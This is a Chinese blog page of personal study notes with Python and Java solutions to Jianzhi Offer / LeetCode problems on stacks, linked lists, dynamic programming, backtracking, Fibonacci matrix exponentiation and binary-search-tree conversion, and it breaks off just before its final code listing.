<p>一个栈当输入，一个栈当输出</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CQueue</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.A = []</span><br><span class="line">        self.B = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">appendTail</span>(<span class="params">self, value: <span class="built_in">int</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.A.append(value)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deleteHead</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(self.B) != <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> self.B.pop()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">while</span>(<span class="built_in">len</span>(self.A) != <span class="number">0</span>):</span><br><span class="line">                self.B.append(self.A.pop())</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(self.B) == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.B.pop()</span><br></pre></td></tr></table></div></figure>


        <h2 id="数组中重复的数字"   >
          <a href="#数组中重复的数字" class="heading-link"><i class="fas fa-link"></i></a><a href="#数组中重复的数字" class="headerlink" title="数组中重复的数字"></a>数组中重复的数字</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221014144507145.png" alt="image-20221014144507145"></p>
<p>使用hash表即可</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findRepeatNumber</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        hashset = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span>(i <span class="keyword">in</span> hashset):</span><br><span class="line">                <span class="keyword">return</span> i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                hashset.add(i)</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="反转链表"   >
          <a href="#反转链表" class="heading-link"><i class="fas fa-link"></i></a><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221014152712281.png" alt="image-20221014152712281"></p>
<p>先是自己写的，从尾部开始改变，时间耗费较多</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseList</span>(<span class="params">self, head: ListNode</span>) -&gt; ListNode:</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">None</span> <span class="keyword">or</span> head.<span class="built_in">next</span> == <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">return</span> head</span><br><span class="line">        originHead = head</span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(originHead.<span class="built_in">next</span> != <span class="literal">None</span>):</span><br><span class="line">            head = originHead</span><br><span class="line">            <span class="keyword">while</span>(head.<span class="built_in">next</span> != <span class="literal">None</span>):</span><br><span class="line">                tmp = head</span><br><span class="line">                <span class="built_in">next</span> = head.<span class="built_in">next</span></span><br><span class="line">                head = <span class="built_in">next</span></span><br><span class="line">            flag += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(flag == <span class="number">1</span>):</span><br><span class="line">                newHead = head</span><br><span class="line">            tmp.<span class="built_in">next</span> = <span class="literal">None</span></span><br><span class="line">            head.<span class="built_in">next</span> = tmp</span><br><span class="line">        <span class="keyword">return</span> newHead</span><br></pre></td></tr></table></div></figure>

<p>后面看题解，可以用多指针来代替，暂存前中后三个节点</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/fan-zhuan-lian-biao-lcof/solution/jian-zhi-offer-24-fan-zhuan-lian-biao-die-dai-di-2/" >剑指 Offer 24. 反转链表（迭代 / 递归，清晰图解） - 反转链表 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseList</span>(<span class="params">self, head: ListNode</span>) -&gt; ListNode:</span></span><br><span class="line">        pre = <span class="literal">None</span></span><br><span class="line">        cur = head</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">None</span>):</span><br><span class="line">            tmp = cur.<span class="built_in">next</span></span><br><span class="line">            cur.<span class="built_in">next</span> = pre</span><br><span class="line">            pre = cur</span><br><span class="line">            cur = tmp</span><br><span class="line">        <span class="keyword">return</span> pre</span><br></pre></td></tr></table></div></figure>

<p>同样的循环可以转化为递归</p>

        <h2 id="连续子数组的最大和"   >
          <a href="#连续子数组的最大和" class="heading-link"><i class="fas fa-link"></i></a><a href="#连续子数组的最大和" class="headerlink" title="连续子数组的最大和"></a>连续子数组的最大和</h2>
      <p>最优子数组的一般都能动态规划</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221015102433428.png" alt="image-20221015102433428"></p>
<p>动态规划</p>
<p>设dp[i]为以i为结尾的连续子数组和的最大值，即可得到状态转换方程</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[i] = max(nums[i],dp[i-1] + nums[i])</span><br></pre></td></tr></table></div></figure>

<p>依据状态转换方程得到代码</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxSubArray</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        dp = [<span class="number">0</span>] * <span class="built_in">len</span>(nums)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>):</span><br><span class="line">                dp[i] = nums[<span class="number">0</span>]</span><br><span class="line">                res = dp[i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dp[i] = <span class="built_in">max</span>(nums[i],dp[i-<span class="number">1</span>] + nums[i])</span><br><span class="line">                res = <span class="built_in">max</span>(res,dp[i])</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>


        <h2 id="链表中倒数第k个节点"   >
          <a href="#链表中倒数第k个节点" class="heading-link"><i class="fas fa-link"></i></a><a href="#链表中倒数第k个节点" class="headerlink" title="链表中倒数第k个节点"></a>链表中倒数第k个节点</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221015104808017.png" alt="image-20221015104808017"></p>
<p>快慢指针</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getKthFromEnd</span>(<span class="params">self, head: ListNode, k: <span class="built_in">int</span></span>) -&gt; ListNode:</span></span><br><span class="line">        originHead = head</span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(n != k):</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            head = head.<span class="built_in">next</span></span><br><span class="line">        <span class="keyword">while</span>(head != <span class="literal">None</span>):</span><br><span class="line">            originHead = originHead.<span class="built_in">next</span></span><br><span class="line">            head = head.<span class="built_in">next</span></span><br><span class="line">        <span class="keyword">return</span> originHead</span><br></pre></td></tr></table></div></figure>


        <h2 id="把数字翻译成字符串"   >
          <a href="#把数字翻译成字符串" class="heading-link"><i class="fas fa-link"></i></a><a href="#把数字翻译成字符串" class="headerlink" title="把数字翻译成字符串"></a>把数字翻译成字符串</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221015161943235.png" alt="image-20221015161943235"></p>
<p>动态规划，详见<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/ba-shu-zi-fan-yi-cheng-zi-fu-chuan-lcof/solution/mian-shi-ti-46-ba-shu-zi-fan-yi-cheng-zi-fu-chua-6/" >面试题46. 把数字翻译成字符串（动态规划，清晰图解） - 把数字翻译成字符串 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">translateNum</span>(<span class="params">self, num: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        numStr = <span class="built_in">str</span>(num)</span><br><span class="line"></span><br><span class="line">        dp = [<span class="number">0</span>] * (<span class="built_in">len</span>(numStr) + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(numStr)):</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>):</span><br><span class="line">                dp[i] = <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">10</span> &lt;= <span class="built_in">int</span>(numStr[i - <span class="number">1</span>]) * <span class="number">10</span> + <span class="built_in">int</span>(numStr[i]) &lt;= <span class="number">25</span>):</span><br><span class="line">                <span class="keyword">if</span> (i - <span class="number">2</span> == -<span class="number">1</span>):</span><br><span class="line">                    dp[i] = <span class="number">2</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                dp[i] = dp[i - <span class="number">2</span>] + dp[i - <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dp[i] = dp[i - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="built_in">len</span>(numStr) - <span class="number">1</span>]</span><br></pre></td></tr></table></div></figure>

<p>需要注意的是组合的数字范围为10<del>25，而不是0</del>25，因为01、02……不能进行组合翻译，我说怎么一直错</p>

        <h2 id="字符串的排列"   >
          <a href="#字符串的排列" class="heading-link"><i class="fas fa-link"></i></a><a href="#字符串的排列" class="headerlink" title="字符串的排列"></a>字符串的排列</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221015113114460.png" alt="image-20221015113114460"></p>
<p>回溯加去重</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">permutation</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">back</span>(<span class="params">s, tmp</span>):</span></span><br><span class="line">            <span class="comment">#到末尾时添加</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">not</span> s):</span><br><span class="line">                res.append(<span class="string">&quot;&quot;</span>.join(tmp))</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">                <span class="comment">#去掉当前的字符的数组，传入下一层的回溯函数</span></span><br><span class="line">                tmpNums = s[:i] + s[i + <span class="number">1</span>:]</span><br><span class="line">                <span class="comment">#表示当前层的字符</span></span><br><span class="line">                tmpTmp = tmp + [s[i]]</span><br><span class="line">                <span class="comment">#调用回溯</span></span><br><span class="line">                back(tmpNums, tmpTmp)</span><br><span class="line">        back(s, [])</span><br><span class="line">        hashSet = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">            hashSet.add(i)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>(hashSet)</span><br></pre></td></tr></table></div></figure>






        <h2 id="从尾到头打印链表"   >
          <a href="#从尾到头打印链表" class="heading-link"><i class="fas fa-link"></i></a><a href="#从尾到头打印链表" class="headerlink" title="从尾到头打印链表"></a>从尾到头打印链表</h2>
      <p>栈</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221015162618579.png" alt="image-20221015162618579"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reversePrint</span>(<span class="params">self, head: ListNode</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        stack = []</span><br><span class="line">        <span class="keyword">while</span>(head != <span class="literal">None</span>):</span><br><span class="line">            stack.append(head.val)</span><br><span class="line">            head = head.<span class="built_in">next</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">len</span>(stack) != <span class="number">0</span>):</span><br><span class="line">            res.append(stack.pop())</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>




        <h2 id="斐波那契数列"   >
          <a href="#斐波那契数列" class="heading-link"><i class="fas fa-link"></i></a><a href="#斐波那契数列" class="headerlink" title="斐波那契数列"></a>斐波那契数列</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221016150131190.png" alt="image-20221016150131190">递归会超时，所以转化为循环</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    F = []</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        self.F = [<span class="number">0</span>] * (n+<span class="number">1</span>)</span><br><span class="line">        self.F[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        self.F[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">        i = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span>( i &lt;= n):</span><br><span class="line">            self.F[i] = (self.F[i-<span class="number">2</span>] + self.F[i-<span class="number">1</span>])% <span class="number">1000000007</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> self.F[n]</span><br></pre></td></tr></table></div></figure>

<p>但是还有时间复杂度更低的矩阵快速幂</p>
<p>参考官方解，时间复杂度为<code>O(logn)</code></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/fei-bo-na-qi-shu-lie-lcof/solution/fei-bo-na-qi-shu-lie-by-leetcode-solutio-hbss/" >斐波那契数列 - 斐波那契数列 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221016154942500.png" alt="image-20221016154942500"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">quickMi</span>(<span class="params">num,power</span>):</span></span><br><span class="line">            ans = <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> (power &gt; <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">if</span>(power &amp; <span class="number">1</span> &gt; <span class="number">0</span>): <span class="comment">#奇数则再乘以底数</span></span><br><span class="line">                    ans = np.dot(ans, num) % <span class="number">1000000007</span></span><br><span class="line">                num = np.dot(num,num)</span><br><span class="line">                power = power &gt;&gt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> ans</span><br><span class="line">        matrix = np.array([[<span class="number">1</span>, <span class="number">1</span>], [<span class="number">1</span>,<span class="number">0</span>]])</span><br><span class="line">        res = quickMi(matrix,n-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> res[<span class="number">0</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></div></figure>




        <h2 id="扑克牌中的顺子"   >
          <a href="#扑克牌中的顺子" class="heading-link"><i class="fas fa-link"></i></a><a href="#扑克牌中的顺子" class="headerlink" title="扑克牌中的顺子"></a>扑克牌中的顺子</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221016162013412.png" alt="image-20221016162013412"></p>
<p>顺子长度不一定为5时</p>
<p>先确定0的个数<code>count</code>，排除0，然后hash去重，得到<code>hashSet</code></p>
<p>先判断去重后<code>hashSet</code>加<code>count</code>的长度是否还是为原数组长度，如果改变则代表有相同的非0元素，则不可能为顺子，直接<code>False</code></p>
<p>判断此时<code>listNums</code>中最大和最小的差值是否小于等于0的个数<code>count</code>加<code>len(listNums)</code>，小于等于则为<code>True</code>，否则为<code>False</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parition</span>(<span class="params">self,nums,low,high</span>):</span></span><br><span class="line">        pivot_idx = random.randint(low,high)</span><br><span class="line">        pivot = nums[pivot_idx]</span><br><span class="line">        left,right = low,high</span><br><span class="line">        nums[left],nums[pivot_idx] = nums[pivot_idx],nums[left]</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right):</span><br><span class="line">            <span class="keyword">while</span>(left &lt; right <span class="keyword">and</span> nums[right] &gt; pivot):</span><br><span class="line">                right -= <span class="number">1</span></span><br><span class="line">            nums[left] = nums[right]</span><br><span class="line">            <span class="keyword">while</span>(left &lt; right <span class="keyword">and</span> nums[left] &lt;= pivot):</span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">            nums[right] = nums[left]</span><br><span class="line">        nums[left] = pivot</span><br><span class="line">        <span class="keyword">return</span> left</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quickSort</span>(<span class="params">self,nums,low,high</span>):</span></span><br><span class="line">        <span class="keyword">if</span>(low &gt; high):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        mid = self.parition(nums,low,high)</span><br><span class="line">        self.quickSort(nums,low,mid-<span class="number">1</span>)</span><br><span class="line">        self.quickSort(nums,mid+<span class="number">1</span>,high)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortArray</span>(<span class="params">self,nums</span>):</span></span><br><span class="line">        self.quickSort(nums,<span class="number">0</span>,<span class="built_in">len</span>(nums)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isStraight</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bool</span>:</span></span><br><span class="line">        hashSet = <span class="built_in">set</span>()</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>):</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            hashSet.add(i)</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(hashSet) + count != <span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        listNums = <span class="built_in">list</span>(hashSet)</span><br><span class="line">        listNums = self.sortArray(listNums)</span><br><span class="line">        <span class="keyword">if</span>(listNums[<span class="built_in">len</span>(listNums)-<span class="number">1</span>] - listNums[<span class="number">0</span>] &lt;= count + <span class="built_in">len</span>(listNums) - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>




        <h2 id="二叉搜索树与双向链表"   >
          <a href="#二叉搜索树与双向链表" class="heading-link"><i class="fas fa-link"></i></a><a href="#二叉搜索树与双向链表" class="headerlink" title="二叉搜索树与双向链表"></a>二叉搜索树与双向链表</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221017161643904.png" alt="image-20221017161643904"></p>
<p>结合中序遍历的特点，加入处理</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorderTraversal</span><span class="params">(Node cur)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(cur == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    inorderTraversal(cur.left);</span><br><span class="line">    <span class="comment">//.......处理指针</span></span><br><span class="line">    inorderTraversal(cur.right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后每次处理的时候，利用前驱节点<code>pre</code>与当前节点<code>cur</code>进行处理</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(pre != <span class="keyword">null</span>)&#123;</span><br><span class="line">    pre.right = cur;</span><br><span class="line">    cur.left = pre;</span><br><span class="line">    pre = cur;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>当前驱节点<code>pre</code>为<code>null</code>时说明在遍历头节点，那么得到头节点，如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    head = cur;</span><br><span class="line">    pre = cur;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>记得最后在头节点和尾部节点也要加入双向指针</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">head.left = pre;</span><br><span class="line">pre.right = head;</span><br></pre></td></tr></table></div></figure>

<p>最终如下</p>
